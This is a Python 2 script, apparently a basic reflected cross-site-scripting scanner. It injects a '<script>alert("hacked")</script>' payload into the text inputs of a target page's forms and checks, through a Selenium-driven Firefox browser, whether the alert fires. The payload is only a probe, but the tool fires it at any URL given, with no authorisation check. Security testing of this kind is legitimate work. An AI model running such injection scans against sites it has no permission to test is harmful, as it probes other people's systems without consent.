import datetime
import urllib
from BeautifulSoup import *
from selenium import webdriver

# VARIABLES
tm = "["+datetime.datetime.now().time().strftime('%H:%M:%S')+"]"
wrn = "[WARNING]"
inf = "[INFO]"


# <!==================================================!>
# XSS INJECTION!!!
def xss():
    # VARIABLES
    while True:     # Checks if url is correct
        url = (raw_input('Enter URL: ')).strip()
        print ".........."
        if "http://" in url:
            break
        elif "https://" in url:
            break
        else:
            print "Wrong input given!\n"
    print tm, inf, "Connecting to the URL..."
    try:
        html = urllib.urlopen(url).read()
        soup = BeautifulSoup(html)
        print tm, inf, "Target URL is stable..."
        print "..........\n.........."
    except:
        print tm, wrn, "Target URL is not stable!!!"
        print tm, wrn, "Make sure you are connected to the internet.\n"
    values = dict()  # Keeps the injected code (URL parameters).
    slash = 0  # Checking how many '/' are in the URL.
    names = ""  # For printing progress (input tag names).
    skata = ""
    f_num = 0  # Counts the number of the forms.
    completed = False

    # FORMS
    try:
        # print soup('form')      # Debugging
        for frm in soup('form'):
            # Progress messages.
            f_num += 1
            try:f_name = frm['name']
            except:f_name = "-"
            try:f_method = frm['method'].upper()
            except:f_method = "GET"
            try:f_action = frm['action']
            except:f_action = url
            print tm, inf, "Searching for vulnerable Forms..."
            print "=================================================="
            print "Form", f_num
            print "=================================================="
            print tm, inf, "Checking Form..."
            print tm, inf, "Form name: '"+f_name+"'..."
            print tm, inf, "Request method used:", "'"+f_method+"'..."

            # CHECK FOR THE PROPER TYPE OF INPUT
            for tag in frm('input'):
                if tag['type'] == "text" or \
                                tag['type'] == "password" or \
                                tag['type'] == "email" or \
                                tag['type'] == "number" or \
                                tag['type'] == "search" or \
                                tag['type'] == "tel" or \
                                tag['type'] == "url":
                    values.update({tag['name']: '<script>alert("hacked");</script>'})
                    print tm, inf, "Input type:", "'"+tag['type'] + "'..."

            # ACTION FIX
            if f_action[-1:] == "/":
                rem_slash = f_action[::-1].replace("/", "", 1)[::-1]
                if "/" in rem_slash:
                    act = rem_slash[:rem_slash.rfind('/'):-1][::-1]
                else:
                    act = rem_slash
            elif "/" in f_action:
                act = f_action[:f_action.rfind('/'):-1][::-1]
            else:
                act = f_action
            print tm, inf, "Action:", "'"+act + "'..."

            # URL FIX
            for char in url:
                if char == "/":
                    slash += 1
            if slash < 3:
                url += "/"

            # FOR COMPARISON WITH THE ACTION
            temp_url = url[url.find('/') + 2::1]
            temp_url = temp_url.strip()
            if temp_url.endswith('/'):
                temp_url = temp_url[::-1].replace("/", "", 1)[::-1]

            # FOR COMPARISON WITH THE URL
            temp_act = act
            temp_act = temp_act.strip()
            if temp_act.endswith('/'):
                temp_act = temp_act[::-1].replace("/", "", 1)[::-1]

            if temp_url == temp_act:
                url = url[:url.rfind('/')]
            else:
                url = url[:url.rfind('/') + 1] + act
            print tm, inf, "New URL:", url

            # APPEND PARAMETERS TO THE URL
            print tm, inf, "Injecting malicious code into the URL..."
            data = urllib.urlencode(values)
            if "?" in url:
                new_page = url + "&" + data
            else:
                new_page = url + "?" + data
            print tm, inf, "Injected URL:", new_page

            # CHECK FOR XSS
            for key, value in values.items(): names = (names+" "+key).strip()
            if names.__len__() == 0: names = "-"
            print tm, inf, "Testing for XSS injection on", "'"+f_method+"'", "parameter(s)", "'"+names+"'..."

            """
            try:
                inj_html = urllib.urlopen(new_page).readlines()
                sou = BeautifulSoup(inj_html)
                # for c in sou('script'):
                    #print c
            except:
                print tm, wrn, "Target URL is not stable!!!"
                print tm, wrn, "Make sure you are connected to the internet.\n"
            """

            # CHECK FOR ALERT
            try:
                browser = webdriver.Firefox()
                browser.get(new_page)
                alert = browser.switch_to_alert()
                skata = alert.text
                alert.accept()
                browser.close()
                # sleep after some time
            except:
                pass
                browser.close()

            if skata == "hacked":
                print "\n<!-- XSS injection is possible --!>"
                print " <!--   XSS type: Reflected   --!>"
                completed = True
            else:
                print "\n<!-- XSS injection is not possible --!>"
                completed = True

            # REINITIALIZATION
            names = ""
            skata = ""
            values.clear()
            print "\n"
        if completed:
            print "Finished successfully!!!"
        else:
            print tm, wrn, "The program was terminated abnormally!"
            print "\nFinish."
        print "=================================================="
    except:
        pass
